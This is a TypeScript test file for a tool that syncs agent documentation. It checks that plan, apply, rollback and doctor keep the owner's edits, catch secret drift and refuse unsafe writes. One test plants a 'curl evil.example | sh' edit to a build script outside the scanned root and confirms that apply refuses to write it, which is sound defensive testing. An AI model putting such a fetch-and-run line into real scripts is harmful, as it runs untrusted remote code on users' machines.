import { spawnSync } from 'node:child_process';
import { mkdtemp, readFile, realpath, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { editText, manualPatch } from '../src/apply/edits.js';
import { runRollback } from '../src/apply/rollback.js';
import { runApply } from '../src/apply/run.js';
import { secretsCheck } from '../src/doctor/checks/secrets.js';
import type { DoctorContext } from '../src/doctor/types.js';
import { lineHash as hashLine } from '../src/plan/lines.js';
import { runPlan } from '../src/plan/run.js';
import type { Plan } from '../src/plan/types.js';
import type { Store } from '../src/store/types.js';
import { applied, commit, git, NOW } from './helpers/doctor.js';
import { materializeFixture } from './helpers/fixture.js';

const LATER = new Date('2026-10-22T13:00:00.000Z');

describe('apply, plan and doctor keep what the owner wrote', () => {
  it('manual patch instruction survives a folder name with a single quote', () => {
    const patch = manualPatch("/home/u/it's here/CLAUDE.md", 'a\nport 3000\n', [{ path: "/home/u/it's here/CLAUDE.md", line: 2, op: 'remove', lineHash: 'x' }], 'git does not track it');
    const cmd = /apply it with: (.*)$/m.exec(patch)?.[1] ?? '';
    // Quote the folder for a POSIX shell: the single quote in it must not end the quoted word.
    expect(cmd).toContain(`cd '/home/u/it'\\''s here'`);
  });

  it('a line edit keeps the endings of lines it does not touch in a mixed-ending file', () => {
    const text = 'one\r\ntwo\nthree\n';
    const out = editText(text, [{ path: 'f', line: 1, op: 'replace', lineHash: 'x', after: 'ONE' }]);
    expect(out).toBe('ONE\r\ntwo\nthree\n');
  });

  it('doctor secrets: a manual secret still in the file after a line was added above it is drift', async () => {
    const dir = await realpath(await mkdtemp(join(tmpdir(), 'tf-secret-')));
    const file = join(dir, 'notes.md');
    const token = `API_TOKEN=tf9${'Zq8xK2mP9vL4wR7nB3cD5eF'}`;
    await writeFile(file, `# notes\n\n${token}\n`);
    const store = { config: { root: dir }, secrets: [{ path: file, line: 3, status: 'manual' }] } as unknown as Store;
    const ctx = { store, home: dir, root: dir } as unknown as DoctorContext;
    expect(await secretsCheck.run(ctx)).toHaveLength(1);
    await writeFile(file, `# notes\n\nadded a line\n${token}\n`);
    // The secret was not rotated or removed; it only moved down one line.
    expect(await secretsCheck.run(ctx)).toHaveLength(1);
  });

  it('doctor secrets: a removed manual secret clears even with other secrets in the file', async () => {
    const dir = await realpath(await mkdtemp(join(tmpdir(), 'tf-secret-')));
    const file = join(dir, 'notes.md');
    const one = `API_TOKEN=tf9${'Zq8xK2mP9vL4wR7nB3cD5eF'}`;
    const two = `OTHER_KEY=tf9${'Hv7kQ2mPx9Lr4wT8nB3cD5e'}`;
    const filler = Array.from({ length: 30 }, (_, n) => `line ${n}`).join('\n');
    const store = { config: { root: dir }, secrets: [{ path: file, line: 2, status: 'manual' }, { path: file, line: 3, status: 'manual' }] } as unknown as Store;
    const ctx = { store, home: dir, root: dir } as unknown as DoctorContext;
    await writeFile(file, `# notes\n${one}\n${two}\n`);
    expect(await secretsCheck.run(ctx)).toHaveLength(2);
    // The first was rotated; the second, still in place, must not stand in for it.
    await writeFile(file, `# notes\nAPI_TOKEN=$API_TOKEN\n${two}\n`);
    expect((await secretsCheck.run(ctx)).map((f) => f.key)).toEqual([`secrets:${file}:3`]);
    // An unrelated secret far below the recorded line is not the one recorded.
    store.secrets = [{ path: file, line: 2, status: 'manual' }];
    await writeFile(file, `# notes\nAPI_TOKEN=$API_TOKEN\n${filler}\n${two}\n`);
    expect(await secretsCheck.run(ctx)).toEqual([]);
  });

  it('apply refuses a view block edited by hand after plan ran', async () => {
    const a = await applied();
    await runPlan(a.root, { home: a.home, reposOnly: false, crontabCommand: 'false', store: a.store, now: LATER, acceptAuto: true });
    const hosts = join(a.store, 'hosts.md');
    const before = await readFile(hosts, 'utf8');
    const mine = before.replace(/(<!-- sync-agent-docs:begin [^\n]+ -->\n)/, '$1my hand edit inside the block\n');
    expect(mine).not.toBe(before);
    await writeFile(hosts, mine);
    commit(a.store, 'hand edit');
    await expect(runApply(a.root, { home: a.home, now: LATER })).rejects.toThrow(/hosts\.md#.* was edited by hand after the plan was made, so nothing was written/);
    expect(git(a.store, 'branch', '--list', 'sync-agent-docs/apply-20261022-130000')).toBe('');
    expect(await readFile(hosts, 'utf8')).toBe(mine);
  });

  it('a second plan and apply with nothing new makes no branch', async () => {
    const a = await applied();
    await runPlan(a.root, { home: a.home, reposOnly: false, crontabCommand: 'false', store: a.store, now: LATER, acceptAuto: true });
    const entry = await runApply(a.root, { home: a.home, now: LATER });
    expect(entry.repos).toEqual([]);
    for (const r of a.entry.repos) expect(git(r.path, 'branch', '--list', 'sync-agent-docs/apply-20261022-130000')).toBe('');
  });

  it('rollback after an apply that changed nothing undoes the apply before it', async () => {
    const a = await applied({ merged: false });
    await runPlan(a.root, { home: a.home, reposOnly: false, crontabCommand: 'false', store: a.store, now: LATER, acceptAuto: true });
    await runApply(a.root, { home: a.home, now: LATER });
    const { entry } = await runRollback(a.root);
    expect(entry.id).toBe(a.entry.id);
    for (const r of a.entry.repos) expect(git(r.path, 'branch', '--list', r.branch)).toBe('');
  });

  it('apply refuses a view block edited again after plan answered its first edit', async () => {
    const a = await applied();
    const hosts = join(a.store, 'hosts.md');
    const edit = (text: string, line: string) => text.replace(/(<!-- sync-agent-docs:begin [^\n]+ -->\n)/, `$1${line}\n`);
    await writeFile(hosts, edit(await readFile(hosts, 'utf8'), 'first hand edit'));
    commit(a.store, 'first edit');
    const plan = await runPlan(a.root, { home: a.home, reposOnly: false, crontabCommand: 'false', store: a.store, now: LATER, acceptAuto: true });
    const item = plan.items.find((i) => i.kind === 'view-edit');
    if (!item) throw new Error('plan raised no view-edit item');
    Object.assign(item, { answer: 'discard', answeredBy: 'hand' });
    await writeFile(join(a.root, '.sync-agent-docs', 'plan.json'), JSON.stringify(plan));
    const again = edit(await readFile(hosts, 'utf8'), 'second hand edit');
    await writeFile(hosts, again);
    commit(a.store, 'second edit');
    await expect(runApply(a.root, { home: a.home, now: LATER })).rejects.toThrow(/was edited by hand after the plan was made/);
    expect(await readFile(hosts, 'utf8')).toBe(again);
  });

  it('answers typed into plan.json by hand survive the next plan', async () => {
    const fx = await materializeFixture('messy-dev', { commit: true });
    const store = join(fx.home, 'truth');
    const opts = { home: fx.home, reposOnly: false, crontabCommand: 'false', store, now: NOW };
    const plan = await runPlan(fx.root, opts);
    const path = join(fx.root, '.sync-agent-docs', 'plan.json');
    const conflict = plan.items.find((i) => i.kind === 'conflict');
    if (!conflict) throw new Error('fixture has no conflict');
    conflict.answer = conflict.options[0] ?? null;
    conflict.answeredBy = 'hand';
    await writeFile(path, JSON.stringify(plan));
    await runPlan(fx.root, opts);
    const again = JSON.parse(await readFile(path, 'utf8')) as Plan;
    expect(again.items.find((i) => i.key === conflict.key)?.answer).toBe(conflict.answer);
  });

  it('doctor with a mistyped option exits 2 (doctor failed), not 1 (drift)', () => {
    const r = spawnSync('node', ['--import', 'tsx', 'src/cli.ts', 'doctor', '.', '--lvie'], { encoding: 'utf8' });
    expect(r.status).toBe(2);
  });
  it('apply refuses an edit to a file outside the scanned root and the machine agent files', async () => {
    const { root, home } = await materializeFixture('messy-dev', { commit: true });
    await runPlan(root, { home, reposOnly: false, crontabCommand: 'false', store: join(home, 'truth'), now: NOW });
    const outside = await realpath(await mkdtemp(join(tmpdir(), 'tf-victim-')));
    git(outside, 'init', '-q', '-b', 'main');
    await writeFile(join(outside, 'build.sh'), 'echo hello\n');
    commit(outside, 'first');
    const planPath = join(root, '.sync-agent-docs', 'plan.json');
    const plan = JSON.parse(await readFile(planPath, 'utf8')) as Plan;
    const item = plan.items.find((i) => Object.values(i.edits).some((e) => e.length));
    const answer = item && Object.entries(item.edits).find(([, e]) => e.length)?.[0];
    if (!item || !answer) throw new Error('the fixture plan proposes no edit');
    const lineHash = hashLine('echo hello');
    for (const i of plan.items) i.answer = null;
    item.answer = answer;
    item.edits[answer] = [{ path: join(outside, 'build.sh'), line: 1, op: 'replace', lineHash, after: 'curl evil.example | sh' }];
    await writeFile(planPath, JSON.stringify(plan));
    await expect(runApply(root, { home, now: LATER })).rejects.toThrow(/outside .* so nothing was written/);
    expect(await readFile(join(outside, 'build.sh'), 'utf8')).toBe('echo hello\n');
    expect(git(outside, 'symbolic-ref', '--short', 'HEAD')).toBe('main');
  });
});
